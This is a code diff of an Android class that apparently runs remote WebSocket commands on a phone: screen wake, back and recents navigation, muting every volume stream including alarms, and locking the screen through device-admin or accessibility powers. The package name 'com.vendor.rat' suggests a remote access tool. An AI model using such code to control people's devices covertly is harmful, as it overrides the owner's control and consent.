@@ -260,29 +260,29 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     }
 
     /**
-     * 导航: home / back / recent
-     * "ho" → HOME, "bak" → 返回, "rec" → 多任务
+     * 导航 / 唤醒屏幕
+     * "ho" → 唤醒屏幕, "bak" → 返回, "rec" → 多任务
      */
     private void handleNav(JsonObject payload) {
         String nav = ScreenActionParser.getNav(payload);
         NavAction action = NavAction.fromShortcut(nav);
         Log.d(TAG, "nav: " + nav + " → " + action);
 
-        MyAccessibilityService service = MyAccessibilityService.P();
-        if (service == null) {
-            Log.w(TAG, "nav: AccessibilityService not available");
-            return;
-        }
-
         switch (action) {
-            case HOME:
-                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+            case WAKE_SCREEN:
+                wakeScreen();
                 break;
             case BACK:
-                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
-                break;
             case RECENTS:
-                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
+                MyAccessibilityService service = MyAccessibilityService.P();
+                if (service == null) {
+                    Log.w(TAG, "nav: AccessibilityService not available");
+                    return;
+                }
+                int globalAction = (action == NavAction.BACK)
+                    ? AccessibilityService.GLOBAL_ACTION_BACK
+                    : AccessibilityService.GLOBAL_ACTION_RECENTS;
+                service.performGlobalAction(globalAction);
                 break;
             default:
                 Log.w(TAG, "nav: unknown nav=" + nav);
@@ -505,12 +505,20 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                     am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
                     break;
                 case MUTE:
-                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0);
-                    am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_MUTE, 0);
+                    // 将所有音量流设为 0 (不用 setRingerMode，避免需要勿扰权限)
+                    am.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0);
+                    am.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
+                    am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
+                    am.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
+                    Log.d(TAG, "volume: muted (all streams set to 0)");
                     break;
                 case UNMUTE:
-                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0);
-                    am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_UNMUTE, 0);
+                    int maxMusic = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+                    int maxRing = am.getStreamMaxVolume(AudioManager.STREAM_RING);
+                    am.setStreamVolume(AudioManager.STREAM_MUSIC, maxMusic / 2, AudioManager.FLAG_SHOW_UI);
+                    am.setStreamVolume(AudioManager.STREAM_RING, maxRing / 2, 0);
+                    am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, maxRing / 2, 0);
+                    Log.d(TAG, "volume: unmuted (music=" + (maxMusic / 2) + ", ring=" + (maxRing / 2) + ")");
                     break;
                 default:
                     Log.w(TAG, "volume: unknown action");
@@ -535,9 +543,27 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
         switch (action) {
             case LOCK:
-                MyAccessibilityService lockService = MyAccessibilityService.P();
-                if (lockService != null) {
-                    lockService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
+                // 直接锁屏，不经过 HOME
+                try {
+                    Context lockCtx = getAppContext();
+                    if (lockCtx != null) {
+                        android.app.admin.DevicePolicyManager dpm =
+                            (android.app.admin.DevicePolicyManager) lockCtx.getSystemService(Context.DEVICE_POLICY_SERVICE);
+                        if (dpm != null && dpm.isAdminActive(
+                                new android.content.ComponentName(lockCtx, "com.vendor.rat.service.AppDeviceAdminReceiver"))) {
+                            dpm.lockNow();
+                            Log.d(TAG, "lock: locked via DevicePolicyManager");
+                        } else {
+                            // 备选: AccessibilityService LOCK_SCREEN (API 28+)
+                            MyAccessibilityService lockService = MyAccessibilityService.P();
+                            if (lockService != null) {
+                                lockService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
+                                Log.d(TAG, "lock: locked via AccessibilityService");
+                            }
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.w(TAG, "lock failed", e);
                 }
                 break;
             case UNLOCK:
